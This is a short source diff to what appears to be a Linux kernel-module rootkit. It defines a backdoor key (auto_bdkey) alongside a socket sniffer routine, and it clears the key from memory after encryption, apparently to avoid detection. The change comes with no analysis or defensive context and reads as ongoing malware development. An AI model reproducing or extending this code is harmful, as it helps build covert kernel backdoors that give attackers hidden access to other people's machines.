@@ -20,7 +20,6 @@
 #include "fs.h"
 #include "lkm.h"
 #include "log.h"
-#include "auto.h"
 
 static LIST_HEAD(iph_node);
 struct iph_node_t {
@@ -32,6 +31,10 @@ struct iph_node_t {
 
 struct task_struct *tsk_iph = NULL;
 static struct kv_crypto_st *kvmgc_bdkey;
+
+// Makefile auto-generated - DO NOT EDIT
+// To reset status: make clean
+uint64_t auto_bdkey = 0x0000000000000000;
 
 #define BD_PATH_NUM 3
 #define BD_OPS_SIZE 2
@@ -633,6 +636,7 @@ struct task_struct *kv_sock_start_sniff(void)
 	*/
 	memcpy(buf, &auto_bdkey, 8);
 	kv_encrypt(kvmgc_bdkey, buf, sizeof(buf));
+	auto_bdkey = 0;
 
 	// load sniffer
 	if (!*running) {
